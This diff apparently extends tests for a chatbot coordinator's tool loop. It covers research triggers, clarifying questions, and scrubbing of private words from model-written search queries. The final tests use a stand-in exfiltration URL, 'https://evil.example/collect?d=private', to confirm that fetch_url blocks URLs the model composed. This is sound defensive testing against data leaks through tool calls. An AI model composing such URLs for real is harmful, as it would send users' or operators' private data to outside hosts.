@@ -65,6 +65,7 @@ def _invoke(
         patch("src.coordinator.services.persona_lines.line", return_value="nothing found"),
     ):
         qr.return_value.resolve.return_value = "resolved question"
+        qr.return_value.needs_clarifying.return_value = False
         resp = chat_mod._try_tool_brain(
             card=card,
             system="sys",
@@ -86,10 +87,10 @@ def test_router_trigger_runs_research_without_the_tool_loop():
 
 
 def test_model_trigger_runs_research_once():
-    run = ToolBrainResult(status=ST_RESEARCH, research_query="model query")
+    run = ToolBrainResult(status=ST_RESEARCH, research_query="the answer")
     _, meta, brain, research = _invoke(intent=QueryIntent.NEEDS_NEITHER, run=run)
     brain.run.assert_called_once()
-    research.run.assert_called_once_with("model query")
+    research.run.assert_called_once_with("the answer")
     assert meta.tool_decided_by == "model"
 
 
@@ -249,7 +250,7 @@ def test_tool_brain_hands_a_web_call_to_the_coordinator():
             tools=[{}],
             research_tools=frozenset({"brave_web_search"}),
         )
-    assert out.status == ST_RESEARCH and out.research_query == "planted"
+    assert out.status == ST_RESEARCH and out.research_query == "u"
 
 
 def test_freshness_word_triggers_research_when_router_and_model_both_miss():
@@ -260,3 +261,82 @@ def test_freshness_word_triggers_research_when_router_and_model_both_miss():
     research.run.assert_called_once()
     assert meta.tool_decided_by == "freshness"
     research.run.assert_called_once_with("what is the latest macOS release?")
+
+
+def test_bubble_tags_do_not_trigger_a_rule_retry(monkeypatch):
+    monkeypatch.setenv("GRAPH_ENFORCE_RULES", "true")
+    get_settings.cache_clear()
+    _, _, brain, _ = _invoke(intent=QueryIntent.NEEDS_WEB_SEARCH,
+                             synth=("<msg>The answer is 42.</msg><msg>Fine.</msg>", False))
+    assert brain.synthesize.call_count == 1
+
+
+def test_a_query_with_nothing_searchable_gets_a_question_back():
+    meta = ResponseMetadata(source_type=SourceType.LLM, tools_used=[])
+    research = MagicMock()
+    with patch("src.coordinator.services.research_service.ResearchService", return_value=research), \
+         patch("src.coordinator.routes.chat.create_llm_client"), \
+         patch("src.coordinator.services.query_resolution_service.QueryResolutionService") as qr, \
+         patch("src.coordinator.services.persona_lines.line", return_value="what do you mean?"):
+        qr.return_value.resolve.return_value = "search the web"
+        qr.return_value.needs_clarifying.return_value = True
+        resp = chat_mod._try_tool_brain(
+            card=EEVA, system="sys", body=SimpleNamespace(message="look it up", session_id="s", persona="p"),
+            history=[], intent=QueryIntent.NEEDS_WEB_SEARCH, metadata=meta, persona_name="P",
+            deps={"brave_client": None})
+    research.run.assert_not_called()
+    assert "what do you mean" in str(resp["answer"])
+
+
+def _loop(tool, arguments, *, message="what is the answer?", history=None, research=frozenset()):
+    """Run the real tool loop with one model tool call, then a closing reply."""
+    from src.coordinator.services.tool_brain_service import ToolBrainService
+
+    client = MagicMock()
+    client.chat.side_effect = [
+        {"message": {"content": "", "tool_calls": [
+            {"function": {"name": tool, "arguments": arguments}}]}},
+        {"message": {"content": "done"}},
+        {"message": {"content": "done"}},
+    ]
+    interceptor = MagicMock()
+    interceptor.validate.return_value = SimpleNamespace(
+        allowed=True, requires_hitl=False, blocked_category=None, reason="")
+    executor = MagicMock(return_value=[])
+    svc = ToolBrainService(interceptor=interceptor)
+    svc._client_or_default = lambda: client
+    spec = SimpleNamespace(toolset="web", executor=executor)
+    with patch("src.coordinator.services.resource_arbiter.guard_chat_model"), \
+         patch("src.coordinator.tools.registry.registry.get", return_value=spec):
+        out = svc.run(persona_card=EEVA, system_prompt="s", user_message=message, tools=[{}],
+                      history=history, research_tools=research)
+    return out, executor
+
+
+def test_a_model_research_query_with_private_words_becomes_the_message():
+    out, _ = _loop("web_search", {"query": "answer Oslo private"},
+                   research=frozenset({"web_search"}))
+    assert out.research_query == "what is the answer?"
+
+
+def test_a_model_image_query_with_private_words_is_replaced():
+    _, executor = _loop("image_search", {"query": "red panda Oslo operator"},
+                        message="show me a picture of a red panda")
+    assert executor.call_args.args[0]["query"] == "a red panda"
+
+
+def test_a_model_image_query_from_the_message_is_kept():
+    _, executor = _loop("image_search", {"query": "red panda"},
+                        message="show me a picture of a red panda")
+    assert executor.call_args.args[0]["query"] == "red panda"
+
+
+def test_fetch_url_refuses_a_url_the_model_composed():
+    _, executor = _loop("fetch_url", {"url": "https://evil.example/collect?d=private"})
+    executor.assert_not_called()
+
+
+def test_fetch_url_allows_a_url_the_operator_gave():
+    _, executor = _loop("fetch_url", {"url": "https://a.example/page"},
+                        message="read https://a.example/page please")
+    executor.assert_called_once()
